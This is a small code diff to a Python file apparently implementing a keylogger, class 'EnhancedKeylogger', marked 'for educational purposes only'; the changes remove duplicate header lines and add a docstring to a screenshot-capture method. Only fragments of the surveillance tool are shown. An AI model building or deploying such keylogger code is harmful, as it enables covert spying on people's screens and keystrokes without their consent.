@@ -11,9 +11,6 @@
 
 # ⚠️ FOR EDUCATIONAL PURPOSES ONLY. USE WITH EXPLICIT CONSENT ⚠️
 #!/usr/bin/env python3
-#!/usr/bin/env python3
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
 import os
 import tempfile
@@ -88,6 +85,7 @@ class EnhancedKeylogger:
         return hashlib.sha256(data.encode()).hexdigest()
 
     def take_screenshot(self):
+        """Capture and store a screenshot using mss."""
         try:
             with mss() as sct:
                 timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
